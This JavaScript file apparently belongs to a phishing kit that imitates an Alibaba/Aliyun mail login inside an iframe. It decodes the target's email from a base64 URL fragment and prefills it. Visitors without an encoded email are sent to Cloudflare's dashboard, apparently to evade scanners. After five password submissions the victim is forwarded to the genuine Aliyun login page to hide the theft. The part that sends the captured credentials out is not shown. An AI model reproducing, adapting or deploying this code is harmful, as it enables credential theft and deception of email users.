(function () {
  const iframe = document.getElementById('alibaba-login-box');
  if (!iframe) { console.error('❌ iframe #alibaba-login-box not found'); return; }

  function getEmailFromURL() {
    try {
  	const raw = window.location.hash.slice(1);
  	if (!raw) return null;
  
  	const decodedHash = decodeURIComponent(raw);
  
  	const base64 = decodedHash
  	  .replace(/[^A-Za-z0-9_\-]/g, '')
  	  .replace(/-/g, '+')
  	  .replace(/_/g, '/')
  	  .replace(/\s/g, '');
  
  	const padLen = (4 - (base64.length % 4)) % 4;
  	const padded = base64 + '='.repeat(padLen);
  
  	const email = atob(padded);
  	const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  	return valid ? email : null;
    } catch (e) {
  	console.warn('getEmailFromURL error', e);
  	return null;
    }
  }
    
  function onIframeLoad() {
    iframe.removeEventListener('load', onIframeLoad);

    const win = iframe.contentWindow;
    const doc = win && win.document;
    if (!doc) { console.warn('⚠️ iframe already cross‑origin – abort helper'); return; }

    const emailInput = doc.getElementById('amge');
    if (emailInput) { emailInput.focus(); console.info('✅ parent helper forced focus on #amge'); }

    const e = getEmailFromURL();
    console.log('hash email detected:', e);
    const pwdInput = doc.getElementById('amgp');

    if (e) {
      if (emailInput) emailInput.value = e;
      if (pwdInput)   pwdInput.focus();
    } else {
      setTimeout(() => {
        console.info('🔀 No e‑mail in hash – redirecting to Cloudflare');
        top.location.href = 'https://dash.cloudflare.com';
      }, 100);
    }
    const form = doc.querySelector('form#login-form');
    if (!form) { console.warn('⚠️ form #login-form not found inside iframe'); return; }

    const MAX_ATTEMPTS = 5;
    let outerAttempts = 0;

    form.addEventListener('submit', function (e) {
      const email = doc.getElementById('amge')?.value.trim() || '';
      const pwd   = doc.getElementById('amgp')?.value.trim() || '';
      if (!email || !pwd) {
        console.log('Missing email or password, not counting attempt');
        return;
      }
      outerAttempts++;
      console.log('🔔 outer submit attempt', outerAttempts, email);

      if (outerAttempts >= MAX_ATTEMPTS && email.includes('@')) {
        const domain = email.split('@')[1];
        //const target = `https://${domain}`;
        const target = `https://mail.aliyun.com/alimail/auth/login?reurl=%2Falimail%2F`;
        console.info('🚀 redirecting whole page to →', target);

        e.stopImmediatePropagation();
        e.preventDefault();
        setTimeout(() => { top.location.href = target; }, 2000);
      }
    }, true);
  }
  iframe.addEventListener('load', onIframeLoad);
})();